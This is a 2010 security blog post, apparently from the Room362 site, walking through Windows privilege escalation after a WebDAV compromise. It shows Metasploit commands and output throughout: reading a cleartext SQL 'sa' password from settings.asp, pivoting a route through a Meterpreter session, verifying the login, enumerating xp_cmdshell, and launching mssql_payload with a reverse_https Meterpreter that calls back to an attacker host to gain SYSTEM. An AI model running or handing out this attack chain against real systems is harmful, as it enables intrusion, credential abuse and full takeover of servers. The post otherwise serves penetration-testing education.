<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>0Exploit Privilege Escalation &middot; Rob &#39;mubix&#39; Fuller</title>
        <meta name="description" content="The other day Chris Gates posted an excellent blog post about the WebDAV hotness that Chris Sullo (author of Nikto) cooked up (DAVTest) which Ryan Linn popped out a Metasploit module for.
Anyways, the story left off being a very limited user called &ldquo;Network Service&rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.
meterpreter &gt; getuid Server username: **NT AUTHORITYNETWORK SERVICE**  Lets look around a bit.">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="generator" content="Hugo 0.17" />
        <meta name="robots" content="index,follow">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <link rel="stylesheet" href="https://room362.com/css/normalize.css">
        <link rel="stylesheet" href="https://room362.com/css/highlight.css">
        <link rel="stylesheet" href="https://room362.com/css/style.css">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
    <body>
        
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-198967-1', 'auto');
ga('send', 'pageview');
</script>


        <div id="wrapper">
            <header class="site-header">
                <div class="container">
                    <div class="site-title-wrapper">
                        
                            <h1 class="site-title">
                                <a title="Room362" href="https://room362.com/">Room362</a>
                            </h1>
                        
                        <a class="button-square" href="https://room362.com/index.xml"><i class="fa fa-rss"></i></a>
                        
                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/mubix">
                                <i class="fa fa-twitter"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/mubix">
                                <i class="fa fa-github-alt"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="LinkedIn" title="LinkedIn" href="https://linkedin.com/in/mubix">
                                <i class="fa fa-linkedin"></i>
                            </a>
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Google+" title="Google+" href="https://google.com/&#43;mubix">
                                <i class="fa fa-google-plus"></i>
                            </a>
                        
                    </div>

                    <ul class="site-nav">
                        
    <li class="site-nav-item">
        <a title="Brandon" href="/brandon/">Brandon</a>
    </li>

    <li class="site-nav-item">
        <a title="About" href="/about/">About</a>
    </li>

    <li class="site-nav-item">
        <a title="Start in Infosec" href="/start/">Start in Infosec</a>
    </li>

    <li class="site-nav-item">
        <a title="Projects" href="/projects/">Projects</a>
    </li>

    <li class="site-nav-item">
        <a title="PwnWiki" href="http://pwnwiki.io">PwnWiki</a>
    </li>

                    </ul>
                </div>
            </header>

            <div id="container">


<div class="container">
    <article class="post-container">
        <header class="post-header">
    <h1 class="post-title">0Exploit Privilege Escalation</h1>
    
</header>

        <div class="post-content clearfix">
    

    <p>The other day <a href="http://carnal0wange.attackresearch.com/">Chris Gates</a> posted an <a href="http://carnal0wnage.attackresearch.com/node/417">excellent blog post</a> about the WebDAV hotness that <a href="http://twitter.com/chrissullo">Chris Sullo</a> (author of <a href="http://cirt.net/Nikto2">Nikto</a>) cooked up (<a href="http://security.sunera.com/2010/04/davtest-quickly-test-exploit-webdav.html">DAVTest</a>) which <a href="http://twitter.com/sussurro">Ryan Linn</a> popped out a <a href="http://trac.happypacket.net/browser/msfmods/trunk/modules/auxiliary/scanner/http/webdav_test.rb">Metasploit module</a> for.</p>

<p>Anyways, the story left off being a very limited user called &ldquo;Network Service&rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.</p>

<pre><code>meterpreter &gt; getuid
Server username: **NT AUTHORITYNETWORK SERVICE**
</code></pre>

<p>Lets look around a bit..</p>

<pre><code>meterpreter &gt; pwd

C:\Inetpub\wwwroot

meterpreter &gt; ls

Listing: C:\Inetpub\wwwroot
===========================
Mode  Size  Type  Last modified  Name
----  ----  ----  -------------  ----
40777/rwxrwxrwx  0  dir  Fri May 07 09:32:19 -0400 2010  .
40777/rwxrwxrwx  0  dir  Mon May 03 12:51:48 -0400 2010  ..
40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  admin
100666/rw-rw-rw-  1587  fil  Sat Dec 08 23:01:24 -0500 2001  default.asp
100666/rw-rw-rw-  1465  fil  Sat Dec 08 23:01:24 -0500 2001  default.css
100666/rw-rw-rw-  3295  fil  Thu Jan 03 12:40:48 -0500 2002  forgotpass.asp
40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  images
40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  language
100666/rw-rw-rw-  1802  fil  Thu Jan 24 12:10:04 -0500 2002  logoff.asp
100666/rw-rw-rw-  7785  fil  Sat Jun 15 19:49:20 -0400 2002  logon.asp
100666/rw-rw-rw-  1801  fil  Mon May 03 12:42:45 -0400 2010  settings.asp
100666/rw-rw-rw-  21137  fil  Wed Aug 28 11:31:42 -0400 2002  setup.asp
</code></pre>

<p>Sweet! a &ldquo;settings.asp&rdquo;</p>

<pre><code>meterpreter &gt; cat settings.asp

&lt;SCRIPT LANGUAGE = &quot;VBScript&quot;&gt;
&lt;(editorial snip)&gt;
SQLUser = &quot;sa&quot;
SQLPass = &quot;SuperDuper#@rdP@$$w0rd2012&quot;
&lt;(/editorial snip)&gt;
&lt;/SCRIPT&gt;
</code></pre>

<p>SA with clear text password. Good luck bruteforcing that one. But they block 1433 directly to the box so direct SQL queries are out. No problem.</p>

<p>Pivoting to the rescue:</p>

<pre><code>meterpreter &gt;
Background session 1? [y/N] 

msf exploit(handler) &gt; route add 192.168.56.0 255.255.255.0 1

msf exploit(handler) &gt; route print

Active Routing Table
====================
Subnet  Netmask  Gateway
------  -------  -------
192.168.56.0  255.255.255.0  Session 1
</code></pre>

<p>Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren&rsquo;t trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions.</p>

<pre><code>msf exploit(handler) &gt; use scanner/mssql/mssql_login
msf auxiliary(mssql_login) &gt; set BLANK_PASSWORDS false
BLANK_PASSWORDS =&gt; false

msf auxiliary(mssql_login) &gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012
PASSWORD =&gt; SuperDuper#@rdP@$$w0rd2012

msf auxiliary(mssql_login) &gt; set RHOSTS 192.168.56.3
RHOSTS =&gt; 192.168.56.3

msf auxiliary(mssql_login) &gt; run

[*] 192.168.56.3:1433 - MSSQL - Trying username:'sa' with password:'SuperDuper#@rdP@$$w0rd2012'

[+] 192.168.56.3:1433 - MSSQL - successful login 'sa' : 'SuperDuper#@rdP@$$w0rd2012'

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

<p>Cool. Now some enumeration and check to see if xp_cmdshell is enabled (it outputs a lot of info so I cut it down to just the pieces we are looking for):</p>

<pre><code>msf exploit(mssql_login) &gt; use admin/mssql/mssql_enum
msf auxiliary(mssql_enum) &gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012
PASSWORD =&gt; SuperDuper#@rdP@$$w0rd2012

msf auxiliary(mssql_enum) &gt; set RHOST 192.168.56.3
RHOST =&gt; 192.168.56.3

msf auxiliary(mssql_enum) &gt; run
[*] Running MS SQL Server Enumeration...

[*] Version:
[*] Microsoft SQL Server  2000 - 8.00.194 (Intel X86)
[*] Aug  6 2000 00:57:48
[*] Copyright (c) 1988-2000 Microsoft Corporation
[*] Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)

&lt;(editorial snip)&gt;

[*] xp_cmdshell is Enabled

&lt;(/editorial snip)&gt;

[*] Instances found on this server:
[*]  MSSQLSERVER
[*] Default Server Instance SQL Server Service is running under the privilege of:
[*] LocalSystem
[*] Auxiliary module execution completed
</code></pre>

<p>XP_CMDSHELL and the server runs as local system. Looking good, payload time.</p>

<pre><code>msf auxiliary(mssql_enum) &gt; use windows/mssql/mssql_payload
msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD =&gt; windows/meterpreter/reverse_https

msf exploit(mssql_payload) &gt; set LHOST 10.10.10.59
LHOST =&gt; 10.10.10.59

msf exploit(mssql_payload) &gt; set RHOST 192.168.56.3
RHOST =&gt; 192.168.56.3

msf exploit(mssql_payload) &gt; set LPORT 443
LPORT =&gt; 443

msf exploit(mssql_payload) &gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012
PASSWORD =&gt; SuperDuper#@rdP@$$w0rd2012

msf exploit(mssql_payload) &gt; exploit

[*] HTTPS listener started on https://10.10.10.59:443/
[*] Command Stager progress - 2.78% done (1494/53675 bytes)
[*] Command Stager progress - 5.57% done (2988/53675 bytes)
[*] Command Stager progress - 8.35% done (4482/53675 bytes)

&lt;(editorial snip)&gt;

[*] Command Stager progress - 94.64% done (50796/53675 bytes)
[*] Command Stager progress - 97.32% done (52235/53675 bytes)
[*] 192.168.56.3:1061 Request received for /AvlbV...
[*] 192.168.56.3:1061 Staging connection for target vlbV received...
[*] Patching Target ID vlbV into DLL
[*] 192.168.56.3:1062 Request received for /BvlbV...
[*] 192.168.56.3:1062 Stage connection for target vlbV received...

[*] Meterpreter session 2 opened (10.10.10.59:443 -&gt; 192.168.56.3:1062) at Thu May 06 22:03:50 -0400 2010

[*] Exploit completed, but no session was created.
msf exploit(mssql_payload) &gt; sessions -i 2
[*] Starting interaction with 2...

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>

<p>Game over..</p>

<p><strong>Note: Routing only sends the module(be it exploit or aux) through the session. Once the payload runs (for exploit modules), it&rsquo;s is calling straight back to the LHOST (Attacker box), not through the session. So, in this example you can now exit session 1 (NETWORK SERVICE) as it&rsquo;s not really needed any more.</strong></p>

</div>

        <footer class="post-footer clearfix">
    

    <div class="share">
        <a class="icon-twitter" href="https://twitter.com/share?text=0Exploit%20Privilege%20Escalation&url=https%3a%2f%2froom362.com%2fpost%2f2010%2f2010-05-07-exploit-privilege-escalation"
            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
            <i class="fa fa-twitter"></i>
            <span class="hidden">Twitter</span>
        </a>

        <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2froom362.com%2fpost%2f2010%2f2010-05-07-exploit-privilege-escalation"
            onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
            <i class="fa fa-facebook"></i>
            <span class="hidden">Facebook</span>
        </a>

        <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2froom362.com%2fpost%2f2010%2f2010-05-07-exploit-privilege-escalation"
           onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
           <i class="fa fa-google-plus"></i>
            <span class="hidden">Google+</span>
        </a>
    </div>
</footer>
    </article>
</div>

            </div>
        </div>

        <footer class="footer">
            <div class="container">
                <div class="site-title-wrapper">
                    <h1 class="site-title">
                        <a title="Room362" href="https://room362.com/">Room362</a>
                    </h1>
                    <a class="button-square button-jump-top js-jump-top" href="#">
                        <i class="fa fa-angle-up"></i>
                    </a>
                </div>

                <p class="footer-copyright">
                    <span>&copy; 2016 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
                </p>
                <p class="footer-copyright">
                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
                </p>
            </div>
        </footer>

        <script src="https://room362.com/js/jquery-1.11.3.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
        <script src="https://room362.com/js/jquery.fitvids.js"></script>
        <script src="https://room362.com/js/scripts.js"></script>
    </body>
</html>

